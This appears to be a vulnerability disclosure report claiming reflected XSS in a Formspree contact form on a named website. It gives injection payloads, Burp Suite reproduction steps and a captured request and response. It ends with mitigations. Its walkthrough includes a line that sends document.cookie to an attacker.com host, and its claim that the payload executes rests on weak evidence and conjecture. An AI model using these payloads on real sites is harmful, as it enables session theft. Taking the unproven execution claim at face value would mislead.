

## Summary

A reflected Cross-Site Scripting (XSS) vulnerability was discovered in the Formspree contact form on the biocorellc.com website. The `message` parameter does not properly sanitize user inputs, allowing for arbitrary JavaScript code execution in the context of the user's browser.

## Affected URL


`https://biocorellc.com/services-capabilities/analytics-ai-machine-learning`

## Vulnerable Parameters

In the following form on the site we tested the fields for first name and Message
![[image (1).png]]`

## Payloads and Responses from them

message=asd'); alert(document.cookie)
![[Screenshot_63.png]]


&lt;script&gt;alert('XSS')&lt;/script&gt;
![[Screenshot_2.png]]

![[Screenshot_1.png]]
As it can be seen in both images here the payload is reflected in the response
## Steps to Reproduce

1. **Navigate to the affected URL.**
    
    - Visit the following page: `https://biocorellc.com/services-capabilities/analytics-ai-machine-learning`.
2. **Open the contact form.**
    
    - Scroll down to the contact form section of the page.
3. **Intercept the form submission using a proxy tool like Burp Suite.**
    
    - Configure your browser to use Burp Suite as a proxy.
    - Fill out the contact form with any dummy data in all fields.
    - Submit the form and intercept the request in Burp Suite.
4. **Modify the `message` parameter in the intercepted request to include the payload:**
    
    - In Burp Suite, locate the intercepted POST request.
    - Modify the `message or first name` parameter to include the payloads:
        
        
     asd'); alert(document.cookie); //
        `
     &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
    
        
5. **Forward the modified request.**
    
    - Forward the modified request to the server.
6. **Observe the JavaScript execu``tion.**
    
    - The browser will execute the injected JavaScript payload.
    - An alert box will display the content of `document.cookie`, confirming the XSS vulnerability.

## Evidence

### Intercepted Request
e

`POST /f/xbjvyola HTTP/2 Host: formspree.io Content-Type: application/x-www-form-urlencoded Content-Length: 169  first-name=John&last-name=Doe&company=Test&email=test@example.com&phone-number=1234567890&message=asd'); alert(document.cookie); //&other-fields=test`

### Server Response



`HTTP/2 200 OK Date: Tue, 09 Jul 2024 13:54:28 GMT Content-Type: text/html; charset=utf-8 ...  <script type="ca5a2d37d431a14461da3a46-text/javascript"> var appendField = function (form, key, value) {   var textarea = document.createElement('textarea')   textarea.setAttribute('name', key)   textarea.innerHTML = value   textarea.setAttribute('style', 'display:none')   form.appendChild(textarea) }  var success = function (response) {   var form = document.querySelector('#passthrough')    try {     // remove data from sessionStorage     sessionStorage.removeItem('data')     sessionStorage.removeItem('sorted_keys')   } catch (e) { }    // handles the case where user has a button named 'submit'   document.createElement('form').submit.call(form) }  function onloadCallback () {   var form = document.querySelector('#passthrough')   var data = {"_referrer": "https://biocorellc.com/services-capabilities/analytics-ai-machine-learning", "_submission_ip": "127.0.0.1", "_submission_nonce": "17325d6a-bb11-4bf3-984c-9c3ebbfbbd1c", "company": "Test", "email": "test@example.com", "first-name": "John", "form-name": "Data Analytics Form", "ip-address": "52.91.21.77", "last-name": "Doe", "message": "asd'); alert(document.cookie); //", "other-fields": "test", "phone-number": "1234567890"}   var keys = ["first-name", "last-name", "company", "email", "phone-number", "message", "other-fields", "ip-address", "form-name"]    try {     if (sessionStorage.getItem('data')) {       if (Object.keys(data).length > 1) { // if data is valid overwrite current storage         sessionStorage.setItem('data', JSON.stringify(data))         sessionStorage.setItem('sorted_keys', JSON.stringify(keys))       } else {         // passed in blank data except submission_nonce         data = JSON.parse(sessionStorage.getItem('data'))         keys = JSON.parse(sessionStorage.getItem('sorted_keys'))       }     } else {       sessionStorage.setItem('data', JSON.stringify(data))       sessionStorage.setItem('sorted_keys', JSON.stringify(keys))     }   } catch (e) { /* Safari for iOS in incognito mode doesn't provide sessionStorage. */ }    for (var i = 0; i < keys.length; i++) {     var key = keys[i]     if (data.hasOwnProperty(key)) {       appendField(form, key, data[key])       delete data[key]     }   }   for (var key in data) {     if (data.hasOwnProperty(key)) {       appendField(form, key, data[key])     }   }    grecaptcha.render('recaptcha', {     'sitekey': "6LepugcTAAAAAP0ScLpB1xpKEoZx5CdRn4tBtdH4",     'callback': success,     'size': window.innerWidth < 480 ? 'compact' : 'normal',     'hl': "en"   }) } </script>`



## Impact

The vulnerability allows an attacker to execute arbitrary JavaScript in the context of the victim's browser. This can lead to:

- Session hijacking
- Theft of sensitive information
- Phishing attacks
- Unauthorized actions on behalf of the user


### Potential Exploit Scenario

#### Context:

1. **Form Submission:** The form on `biocorellc.com` uses Formspree.io to handle form submissions. When a user submits the form, the data, including the `message` parameter, is sent to Formspree.io.
2. **Dashboard Handling:** Formspree.io has a dashboard where users (the owners of the forms) can view the submissions they have received.

#### Attack Steps:

1. **Crafting the Malicious Payload:**
    
    - An attacker crafts a payload designed to execute JavaScript when viewed in the Formspree.io dashboard.
    - Example payload: `'); alert(document.cookie); //`
2. **Submitting the Form:**
    
    - The attacker submits the form on `biocorellc.com` with the malicious payload in the `message` field.
    - The form data is sent to Formspree.io, including the malicious payload.
3. **Viewing the Submission:**
    
    - When the owner of the form logs into the Formspree.io dashboard to view submissions, the dashboard will render the submitted data.
    - If the Formspree.io dashboard does not properly sanitize and escape the form data, the JavaScript payload will execute in the context of the owner’s browser.
4. **Exploiting the XSS:**
    
    - The JavaScript payload can perform actions such as:
        - Stealing session cookies: `document.cookie`
        - Sending HTTP requests to other endpoints to exfiltrate data
        - Executing further malicious scripts
        - Manipulating the dashboard or performing actions on behalf of the logged-in user

#### Potential Impacts:

1. **Session Hijacking:**
    
    - The attacker can steal the session cookie of the Formspree.io dashboard user and impersonate them.
    - This can lead to unauthorized access to sensitive information or administrative functions.
2. **Data Theft:**
    
    - The attacker can access and steal data from the Formspree.io dashboard, including other form submissions.
3. **Phishing and Social Engineering:**
    
    - The attacker can use the stolen session to send phishing messages to other users or perform social engineering attacks.
4. **Further Exploitation:**
    
    - The attacker can inject additional payloads to spread the attack within the organization, potentially compromising more systems or data.

### Example Attack Walkthrough:

1. **Submission with Payload:**
    
    - The attacker fills out the form on `biocorellc.com` with the payload: `'); alert(document.cookie); //` in the `message` field.
    - This payload is encoded and submitted to Formspree.io.
2. **Interception and Modification:**
    
    - Using a tool like Burp Suite, the attacker intercepts the form submission request and ensures the payload is correctly formatted and injected.
3. **Dashboard Rendering:**
    
    - When the form owner logs into Formspree.io and views the submission, the payload is executed.
    - An alert box displaying `document.cookie` appears, indicating the payload execution.
4. **Cookie Theft:**
    
    - Instead of a simple alert, the payload can be modified to send the cookie to an attacker-controlled server:
        
        javascript
        
        Copy code
        
        `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>`
        
5. **Session Hijack:**
    
    - The attacker uses the stolen session cookie to access the Formspree.io dashboard without authentication.

### Mitigations:

1. **Sanitization and Escaping:**
    
    - Ensure all user-submitted data is properly sanitized and escaped before rendering in the dashboard.
2. **Content Security Policy (CSP):**
    
    - Implement a strict CSP to limit the sources from which scripts can be executed.
3. **Input Validation:**
    
    - Validate and sanitize inputs on both client-side and server-side to prevent malicious code from being submitted.
4. **Security Awareness:**
    
    - Educate users and administrators about the risks of XSS and how to recognize suspicious activity.

